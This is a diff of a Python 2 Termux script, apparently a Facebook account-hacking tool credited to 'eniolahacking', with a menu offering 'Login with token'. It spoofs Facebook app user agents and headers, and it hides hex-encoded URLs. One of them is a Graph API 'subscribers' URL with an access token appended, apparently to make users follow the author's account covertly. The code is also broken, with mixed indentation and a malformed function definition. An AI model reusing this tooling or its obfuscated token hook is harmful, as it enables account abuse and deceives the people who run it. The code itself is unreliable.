@@ -1,84 +1,90 @@
- 
-#coding=utf-8
-
 #!/usr/bin/python2
+# -*- coding: utf-8
 
-#decompile by star-vampire
+#AUTHOR : eniolahacking (MR. EFK)
+#OPEN SOURCE :)
+#DON'T FORGET TO GIVE CREDIT TO MR. EFK
+
+P = "\033[97;1m" 
+M = "\033[91;1m" 
+H = "\033[92;1m" 
+K = "\033[93;1m" 
+B = "\033[94;1m" 
+U = "\033[95;1m" 
+O = "\033[93;1m" 
+N = "\033[0m"
 
 try:
-    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
-    from multiprocessing.pool import ThreadPool
+	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
+	from multiprocessing.pool import ThreadPool
+	from requests.exceptions import ConnectionError
 except ImportError:
-    os.system('termux-setup-storage')
+	os.system("pip2 install requests")
+	os.system("python2 uck.py")
+
+from os import system
+from time import sleep
+
+def xox(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.04)
+      
+agents = [
+					"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
+					"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+					"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+					"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]",
+					"Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",
+					"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]",
+					"Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"
+				  ]
+				
+header = {"user-agent": '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
+					  "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
+					  "x-fb-sim-hni": str(random.randint(20000, 40000)),
+					  "x-fb-net-hni": str(random.randint(20000, 40000)),
+					  "x-fb-connection-quality": "EXCELLENT",
+					  "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+					  "content-type": "application/x-www-form-urlencoded",
+					  "x-fb-http-engine": "Liger"
+					  }
+					
+user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])
 
 try:
-    os.mkdir('/sdcard/ids')
-except OSError:
-    pass
-
-os.system('clear')
-if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
-    os.system('apt update && apt install nodejs -y')
-if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
-    os.system('apt install ruby -y && gem install lolcat')
-from requests.exceptions import ConnectionError
-os.system('git pull')
-if not os.path.isfile('/data/data/com.termux/files/home/PROHACK-FILE/JJJJJ/node_modules/bytes/index.js'):
-    os.system('fuser -k 5000/tcp &')
-    os.system('#')
-    os.system('cd JJJJJ && npm install')
-    os.system('cd JJJJJ && node index.js &')
-    os.system('clear')
-    print '\x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
-    os.system('xdg-open https://github.com/eniolahacking')
-    time.sleep(10)
-elif os.path.isfile('/data/data/com.termux/files/home/PROHACK-FILE/JJJJJ/node_modules/bytes/index.js'):
-    os.system('fuser -k 5000/tcp &')
-    os.system('#')
-    os.system('cd JJJJJ && node index.js &')
-    os.system('clear')
-    print '\x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
-    os.system('xdg-open https://github.com/eniolahacking')
-    time.sleep(10)
-bd = random.randint(20000000.0, 30000000.0)
-sim = random.randint(20000.0, 40000.0)
-header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-
-'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 
-
-'Liger'}
-reload(sys)
-sys.setdefaultencoding('utf-8')
-c = '\x1b[1;32m'
-c2 = '\x1b[0;97m'
-c3 = '\x1b[1;31m'
-c = '\x1b[1;32m'
-c2 = '\x1b[0;97m'
-c3 = '\x1b[1;31m'
-os.system('git pull')
-os.system('clear')
-
+	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
+	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')
+except requests.exceptions.ConnectionError:
+	os.system("clear")
+	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
+	sys.exit()
+	
+ip = requests.get('https://api.ipify.org').text.strip()
+loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
+	
+def linex():
+	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
 def logo():
 	os.system('echo "\n  ███████  ▒ ▒ ▒ ███████     █           █\n  █                               █                      █         █\n  █                               █                      █      █\n  ███████              ███████    █   █\n█                               █                      █       █\n   ███████              █                      █         █\n    ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n    ░   ▒░  ░ ░ ░ ░ ░ ▒ ░░      ░\n        ░  ░  ░ ░     ░         ░\n            ░\n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: { uck }        ║\n    ║ AUTHOR   : ENIOLA HACKING        ║\n    ║ GITHUB   : git.io/eniolahacking     ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
 
+def main():
+	os.system("clear")
+	logo()
+	print("\t\033[93;1m      MAIN MENU\x1b[0m")
+	print("")
+        print("")
+	print(" \x1b[1;92m  \t(Login menu)")
+	print("")
+	print(47*"-")
+	print("\x1b[1;92m[1]\x1b[1;93m Login with Facebook\n")
+	print("\x1b[1;92m[2]\x1b[1;93m Login with token \x1b[1;92m[BEST]\n")
+	print("\x1b[1;92m[3]\x1b[1;93m Back ")
+	print(47*"\x1b[1;92m-")
+	print("")
+        log_select()
 
-def log_menu():
-    try:
-        t_check = open('access_token.txt', 'r')
-        menu()
-    except (KeyError, IOError):
-        os.system('clear')
-               def logo()
-		print("")
-		print(" \x1b[1;92m  \t(Login menu)")
-		print("")
-		print(47*"-")
-		print("\x1b[1;92m[1]\x1b[1;93m Login with Facebook\n")
-		print("\x1b[1;92m[2]\x1b[1;93m Login with token \x1b[1;92m[BEST]\n")
-		print("\x1b[1;92m[3]\x1b[1;93m Back ")
-		print(47*"\x1b[1;92m-")
-		print("")
-                log_select()
 def log_select():
 	sel = raw_input("\x1b[1;92m Choose option: ")
 	if sel =="1":
